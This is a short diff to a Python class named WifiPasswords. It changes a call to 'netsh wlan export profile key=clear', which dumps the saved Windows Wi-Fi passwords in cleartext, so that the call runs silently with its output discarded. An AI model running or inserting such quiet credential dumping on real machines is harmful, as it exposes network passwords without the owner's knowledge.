@@ -13,7 +13,8 @@ class WifiPasswords:
         self.ssid = []
         self.password = []
 
-        subprocess.run("netsh wlan export profile key=clear", capture_output=True).stdout.decode()
+        #subprocess.run("netsh wlan export profile key=clear", capture_output=True).stdout.decode()
+        subprocess.run("netsh wlan export profile key=clear", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
         self.path = os.getcwd()
 
     def get_files(self):
